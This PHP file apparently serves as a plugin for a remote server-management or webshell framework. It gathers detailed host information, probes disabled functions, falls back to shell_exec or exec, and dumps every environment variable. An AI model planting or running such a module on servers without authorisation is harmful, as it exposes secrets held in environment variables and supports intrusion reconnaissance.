<?php
$get = static function ($value, $key, $default = null) {
    return is_array($value) && array_key_exists($key, $value) ? $value[$key] : $default;
};
$disabledFunctions = array_values(array_filter(array_map('trim', explode(',', (string)ini_get('disable_functions')))));
$available = static function ($name) use ($disabledFunctions) {
    return function_exists($name) && !in_array($name, $disabledFunctions, true);
};
$run = static function ($command) use ($available) {
    if ($available('shell_exec')) {
        $output = @shell_exec($command . ' 2>&1');
        if (is_string($output)) return trim($output);
    }
    if ($available('exec')) {
        $lines = [];
        @exec($command . ' 2>&1', $lines);
        return trim(implode("\n", $lines));
    }
    return '';
};
$osFamily = static function () {
    if (defined('PHP_OS_FAMILY')) return constant('PHP_OS_FAMILY');
    $name = strtoupper(PHP_OS);
    if (strpos($name, 'WIN') === 0) return 'Windows';
    if (strpos($name, 'DAR') === 0) return 'Darwin';
    if (strpos($name, 'LIN') === 0) return 'Linux';
    return PHP_OS;
};
$toMb = static function ($bytes) { return (int)round(max(0, (float)$bytes) / 1048576); };
$percent = static function ($used, $total) { return $total > 0 ? round($used * 100 / $total, 2) : 0; };
$sizeToBytes = static function ($value) {
    if (!preg_match('/([0-9]+(?:\.[0-9]+)?)\s*([KMGT]?)/i', (string)$value, $matches)) return 0;
    $powers = ['' => 0, 'K' => 1, 'M' => 2, 'G' => 3, 'T' => 4];
    return (float)$matches[1] * pow(1024, $powers[strtoupper($matches[2])]);
};
$collectHardware = static function ($family) use ($available, $run, $toMb, $percent, $sizeToBytes) {
    $info = [];
    $processors = $available('getenv') ? (int)getenv('NUMBER_OF_PROCESSORS') : 0;
    if ($processors < 1 && is_readable('/proc/cpuinfo')) {
        $cpu = @file_get_contents('/proc/cpuinfo');
        if (is_string($cpu)) $processors = preg_match_all('/^processor\s*:/m', $cpu, $unused);
    }
    if ($processors < 1) {
        $value = $family === 'Darwin' ? $run('sysctl -n hw.ncpu') : $run('getconf _NPROCESSORS_ONLN');
        if (is_numeric($value)) $processors = (int)$value;
    }
    if ($processors > 0) $info['AvailableProcessors'] = $processors;
    if ($available('sys_getloadavg')) {
        $load = @sys_getloadavg();
        if (is_array($load)) $info['SystemLoadAverage'] = round((float)$load[0], 2);
    }

    $total = 0; $free = 0; $swapTotal = 0; $swapFree = 0;
    if (is_readable('/proc/meminfo')) {
        $memory = [];
        foreach ((array)@file('/proc/meminfo', FILE_IGNORE_NEW_LINES) as $line) {
            if (preg_match('/^([A-Za-z_()]+):\s+([0-9]+)/', $line, $matches)) $memory[$matches[1]] = (float)$matches[2] * 1024;
        }
        $total = isset($memory['MemTotal']) ? $memory['MemTotal'] : 0;
        $free = isset($memory['MemAvailable']) ? $memory['MemAvailable'] :
            ((isset($memory['MemFree']) ? $memory['MemFree'] : 0) + (isset($memory['Buffers']) ? $memory['Buffers'] : 0) +
             (isset($memory['Cached']) ? $memory['Cached'] : 0));
        $swapTotal = isset($memory['SwapTotal']) ? $memory['SwapTotal'] : 0;
        $swapFree = isset($memory['SwapFree']) ? $memory['SwapFree'] : 0;
    } elseif ($family === 'Darwin') {
        $total = (float)$run('sysctl -n hw.memsize');
        $vm = $run('vm_stat');
        $pageSize = preg_match('/page size of\s+([0-9]+)/i', $vm, $page) ? (int)$page[1] : 4096;
        foreach (['Pages free', 'Pages inactive', 'Pages speculative'] as $key) {
            if (preg_match('/^' . preg_quote($key, '/') . ':\s+([0-9]+)/mi', $vm, $match)) $free += (float)$match[1] * $pageSize;
        }
        $swap = $run('sysctl vm.swapusage');
        if (preg_match('/total\s*=\s*([^\s]+).*free\s*=\s*([^\s]+)/i', $swap, $match)) {
            $swapTotal = $sizeToBytes($match[1]);
            $swapFree = $sizeToBytes($match[2]);
        }
    } elseif ($family === 'Windows') {
        $raw = $run('wmic OS get FreePhysicalMemory,FreeVirtualMemory,TotalVirtualMemorySize,TotalVisibleMemorySize /Value');
        $memory = [];
        foreach (preg_split('/\r?\n/', $raw) as $line) {
            if (preg_match('/^([A-Za-z]+)=([0-9]+)$/', trim($line), $match)) $memory[$match[1]] = (float)$match[2] * 1024;
        }
        $total = isset($memory['TotalVisibleMemorySize']) ? $memory['TotalVisibleMemorySize'] : 0;
        $free = isset($memory['FreePhysicalMemory']) ? $memory['FreePhysicalMemory'] : 0;
        $virtualTotal = isset($memory['TotalVirtualMemorySize']) ? $memory['TotalVirtualMemorySize'] : 0;
        $virtualFree = isset($memory['FreeVirtualMemory']) ? $memory['FreeVirtualMemory'] : 0;
        $swapTotal = max(0, $virtualTotal - $total);
        $swapFree = max(0, min($swapTotal, $virtualFree - $free));
    }
    if ($total > 0) {
        $free = min($total, max(0, $free));
        $info += ['TotalPhysicalMemoryMB' => $toMb($total), 'FreePhysicalMemoryMB' => $toMb($free),
            'UsedPhysicalMemoryMB' => $toMb($total - $free), 'PhysicalMemoryUsagePercent' => $percent($total - $free, $total)];
    }
    $swapFree = min($swapTotal, max(0, $swapFree));
    $info += ['TotalSwapSpaceMB' => $toMb($swapTotal), 'FreeSwapSpaceMB' => $toMb($swapFree),
        'UsedSwapSpaceMB' => $toMb($swapTotal - $swapFree), 'SwapUsagePercent' => $percent($swapTotal - $swapFree, $swapTotal)];
    return $info;
};
$collectFileSystems = static function ($family) use ($run, $toMb, $percent) {
    $result = [];
    if ($family === 'Windows') {
        foreach (range('A', 'Z') as $drive) {
            $root = $drive . ':\\';
            if (!is_dir($root)) continue;
            $total = @disk_total_space($root); $free = @disk_free_space($root);
            if ($total > 0 && $free !== false) $result[] = ['Name' => $drive . ':', 'Root' => $root, 'Type' => 'Drive',
                'TotalSpaceMB' => $toMb($total), 'UsableSpaceMB' => $toMb($free), 'UsedSpaceMB' => $toMb($total - $free),
                'UsagePercent' => $percent($total - $free, $total)];
        }
    } else {
        $seen = [];
        $lines = preg_split('/\r?\n/', $run('df -P -k'));
        foreach (array_slice($lines, 1) as $line) {
            $fields = preg_split('/\s+/', trim($line), 6);
            if (count($fields) !== 6 || !is_numeric($fields[1]) || (float)$fields[1] <= 0) continue;
            $root = $fields[5];
            if (isset($seen[$root])) continue;
            $seen[$root] = true;
            $total = (float)$fields[1] * 1024; $used = (float)$fields[2] * 1024; $free = (float)$fields[3] * 1024;
            $result[] = ['Name' => $fields[0], 'Root' => $root, 'Type' => 'File System',
                'TotalSpaceMB' => $toMb($total), 'UsableSpaceMB' => $toMb($free), 'UsedSpaceMB' => $toMb($used),
                'UsagePercent' => $percent($used, $total)];
        }
        if (!$result) {
            $total = @disk_total_space(DIRECTORY_SEPARATOR); $free = @disk_free_space(DIRECTORY_SEPARATOR);
            if ($total > 0 && $free !== false) $result[] = ['Name' => DIRECTORY_SEPARATOR, 'Root' => DIRECTORY_SEPARATOR,
                'Type' => 'File System', 'TotalSpaceMB' => $toMb($total), 'UsableSpaceMB' => $toMb($free),
                'UsedSpaceMB' => $toMb($total - $free), 'UsagePercent' => $percent($total - $free, $total)];
        }
    }
    return $result;
};
$networkEntry = static function ($name) {
    return ['Name' => $name, 'DisplayName' => $name, 'IsUp' => false,
        'IsLoopback' => $name === 'lo' || strpos($name, 'lo') === 0, 'IsPointToPoint' => false,
        'IsVirtual' => preg_match('/^(docker|veth|virbr|br|vmnet|utun|tun|tap)/i', $name) === 1,
        'MTU' => 0, 'IPAddresses' => []];
};
$collectNetwork = static function ($family) use ($available, $run, $networkEntry) {
    $result = [];
    if ($available('net_get_interfaces')) {
        foreach ((array)@net_get_interfaces() as $name => $details) {
            $item = $networkEntry((string)$name);
            $item['IsUp'] = isset($details['up']) ? (bool)$details['up'] : true;
            foreach (isset($details['unicast']) ? (array)$details['unicast'] : [] as $address) {
                $value = isset($address['address']) ? (string)$address['address'] : '';
                if (filter_var($value, FILTER_VALIDATE_IP)) $item['IPAddresses'][] = $value;
                elseif (preg_match('/^[0-9a-f]{2}(?::[0-9a-f]{2}){5}$/i', $value)) $item['MACAddress'] = strtoupper($value);
            }
            $result[$name] = $item;
        }
    } elseif ($family !== 'Windows') {
        foreach (preg_split('/\r?\n/', $run('ip -o link show')) as $line) {
            if (!preg_match('/^\d+:\s+([^:]+):\s+<([^>]*)>.*\bmtu\s+([0-9]+)/i', trim($line), $match)) continue;
            $name = preg_replace('/@.*/', '', trim($match[1]));
            $item = $networkEntry($name); $item['IsUp'] = strpos(',' . strtoupper($match[2]) . ',', ',UP,') !== false; $item['MTU'] = (int)$match[3];
            if (preg_match('/\blink\/ether\s+([0-9a-f:]{17})/i', $line, $mac)) $item['MACAddress'] = strtoupper($mac[1]);
            $result[$name] = $item;
        }
        foreach (preg_split('/\r?\n/', $run('ip -o addr show')) as $line) {
            if (!preg_match('/^\d+:\s+([^\s]+)\s+inet6?\s+([^\s\/]+)/i', trim($line), $match)) continue;
            $name = preg_replace('/@.*/', '', $match[1]);
            if (!isset($result[$name])) $result[$name] = $networkEntry($name);
            $result[$name]['IsUp'] = true; $result[$name]['IPAddresses'][] = $match[2];
        }
        if (!$result) foreach (preg_split('/\r?\n(?=\S)/', $run('ifconfig -a')) as $block) {
            if (!preg_match('/^([^\s:]+)(?::|\s)/', $block, $match)) continue;
            $item = $networkEntry($match[1]); $item['IsUp'] = preg_match('/<[^>]*\bUP\b[^>]*>|status:\s*active/i', $block) === 1;
            if (preg_match('/\bmtu\s+([0-9]+)/i', $block, $mtu)) $item['MTU'] = (int)$mtu[1];
            if (preg_match('/\b(?:ether|HWaddr)\s+([0-9a-f:]{17})/i', $block, $mac)) $item['MACAddress'] = strtoupper($mac[1]);
            preg_match_all('/\binet6?\s+(?:addr:)?([0-9a-f:.]+)/i', $block, $ips); $item['IPAddresses'] = isset($ips[1]) ? $ips[1] : [];
            $result[$item['Name']] = $item;
        }
    }
    if (!$result) {
        $host = $available('gethostname') ? @gethostname() : php_uname('n');
        $item = $networkEntry($host ? $host : 'host'); $item['IsUp'] = true;
        $addresses = $host ? @gethostbynamel($host) : false; $item['IPAddresses'] = is_array($addresses) ? $addresses : [];
        $result[$item['Name']] = $item;
    }
    foreach ($result as &$item) $item['IPAddresses'] = array_values(array_unique($item['IPAddresses']));
    unset($item);
    return array_values($result);
};
$collectEnvironment = static function ($family) use ($available, $run) {
    $result = is_array($_ENV) ? $_ENV : [];
    if ($available('getenv') && version_compare(PHP_VERSION, '7.1.0', '>=')) {
        $values = getenv();
        if (is_array($values)) $result = $values + $result;
    }
    if ($available('getenv')) foreach ($_SERVER as $key => $value) {
        if (!is_string($key) || is_array($value)) continue;
        $environmentValue = getenv($key);
        if ($environmentValue !== false) $result[$key] = $environmentValue;
    }
    if (!$result) foreach (preg_split('/\r?\n/', $run($family === 'Windows' ? 'set' : 'env')) as $line) {
        $separator = strpos($line, '=');
        if ($separator > 0) $result[substr($line, 0, $separator)] = substr($line, $separator + 1);
    }
    foreach ($result as $key => $value) {
        if (!is_scalar($value)) unset($result[$key]);
        else $result[$key] = (string)$value;
    }
    ksort($result);
    return $result;
};
return [
    'id' => 'BasicInfoComponent', 'version' => '1.1.0',
    'handle' => static function ($action, $params) use ($get, $available, $disabledFunctions, $osFamily, $collectHardware, $collectFileSystems, $collectNetwork, $collectEnvironment) {
        $family = $osFamily(); $documentRoot = (string)$get($_SERVER, 'DOCUMENT_ROOT', '');
        $serverSoftware = (string)$get($_SERVER, 'SERVER_SOFTWARE', '');
        $extensions = array_values(get_loaded_extensions()); sort($extensions);
        return ['BasicInfo' => [
            'collectTime' => (int)round(microtime(true) * 1000),
            'OSInfo' => ['OSName' => $family, 'OSVersion' => php_uname('r'), 'OSArch' => php_uname('m'),
                'HostName' => $available('gethostname') ? (string)gethostname() : php_uname('n')],
            'UserInfo' => ['UserName' => $available('get_current_user') ? get_current_user() : '', 'UserDir' => getcwd(),
                'UserHome' => (string)$get($_SERVER, 'HOME', ''), 'UserLanguage' => (string)$get($_SERVER, 'LANG', ''),
                'UserTimezone' => date_default_timezone_get()],
            'MiddlewareInfo' => ['MiddlewareType' => $serverSoftware !== '' ? $serverSoftware : PHP_SAPI,
                'ServerInfo' => $serverSoftware, 'ContextPath' => $documentRoot, 'Version' => PHP_VERSION],
            'PhpRuntimeInfo' => ['PHPVersion' => PHP_VERSION, 'SAPI' => PHP_SAPI, 'Extensions' => $extensions,
                'MemoryLimit' => (string)ini_get('memory_limit'), 'MaxExecutionTime' => (string)ini_get('max_execution_time'),
                'OpenBasedir' => (string)ini_get('open_basedir'),
                'DisabledFunctions' => $disabledFunctions],
            'ProcessInfo' => ['ProcessName' => PHP_SAPI, 'ProcessId' => getmypid(), 'CurrentPath' => getcwd()],
            'EnvironmentInfo' => $collectEnvironment($family), 'HardwareInfo' => $collectHardware($family),
            'NetworkInfo' => $collectNetwork($family), 'FileSystemInfo' => $collectFileSystems($family)
        ], 'code' => 200];
    }
];
